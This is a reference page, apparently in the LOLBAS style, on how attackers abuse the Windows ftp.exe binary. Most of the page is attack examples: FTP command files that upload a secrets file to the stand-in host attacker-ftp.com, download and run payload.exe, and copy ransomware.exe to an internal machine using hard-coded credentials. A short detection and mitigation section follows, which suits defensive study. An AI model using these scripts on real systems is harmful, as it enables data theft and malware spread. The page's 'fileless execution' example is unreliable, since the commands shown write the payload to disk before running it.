# ftp.exe  
## What is it?  
*```ftp.exe``` is a **built-in Windows command-line tool** used for **File Transfer Protocol (FTP) communication**.*  
*It allows users to connect to FTP servers, upload/download files, and perform remote file management.*  
*Because it's a **trusted Windows binary**, attackers can abuse it for **stealthy data exfiltration and malware retrieval**.*  

## Legitimate Usage  
- **File Transfers** → Upload/download files between local and remote systems.  
- **Website Management** → Manage files on web hosting servers.  
- **Automated Scripting** → Used in batch scripts for scheduled file transfers.  

## How to abuse it  
- **Data Exfiltration** → Stealthily transfer stolen files to an attacker-controlled FTP server.  
- **Malware Download & Execution** → Fetch malicious payloads from a remote server.  
- **Bypassing Security Controls** → Uses a trusted binary that might not be monitored.  
- **Anonymous FTP Access** → Exploit misconfigured servers for hidden data storage.  

## Example Attacks  
### 1. Stealthy Data Exfiltration  
*Attackers can transfer files from the victim machine to an FTP server.*  

```
ftp -n -s:ftp_commands.txt
```

**Content of `ftp_commands.txt`:**  

```
open attacker-ftp.com
user anonymous anonymous
put C:\SensitiveData\secrets.txt
bye
```

**Effect:**  
- Uploads `secrets.txt` to the attacker's FTP server **without user interaction**.  

### 2. Download & Execute Malware  
*Attackers can fetch a malicious file and execute it.*  

```
ftp -n -s:ftp_script.txt
```

**Content of `ftp_script.txt`:**  

```
open attacker-ftp.com
user malware_user pass123
binary
get payload.exe
bye
```
```
payload.exe
```

**Effect:**  
- **Downloads malware** (`payload.exe`) and executes it on the system.  

### 3. Fileless Execution (LOLBas Abuse)  
*Attackers can use FTP in-memory execution to avoid writing files to disk.*  

```
ftp -i -s:ftp_script.txt & start payload.exe
```

- Avoids **dropping files directly** to evade detection.  

### 4. Lateral Movement via FTP  
*Compromised systems can be used to spread malware across a network.*  

```
ftp -n -s:ftp_spread.txt
```

**Content of `ftp_spread.txt`:**  

```
open 192.168.1.50
user admin password123
put ransomware.exe
bye
```

**Effect:**  
- **Uploads ransomware** to another machine inside the network.  

## Detection & Mitigation  
### Detection Methods  
- **Monitor FTP Traffic** → Look for unauthorized external connections.  
- **Detect Automated Scripts** → Track use of `ftp.exe -s` with script files.  
- **Identify Suspicious File Transfers** → Monitor logs for unexpected FTP activity.  

### Mitigation Strategies  
- **Disable `ftp.exe` if Not Needed** → Use `AppLocker` or `WDAC` to block execution.  
- **Use Network Monitoring** → Detect and block unauthorized FTP connections.  
- **Enable Secure Transfers** → Require FTPS/SFTP instead of plain FTP.  
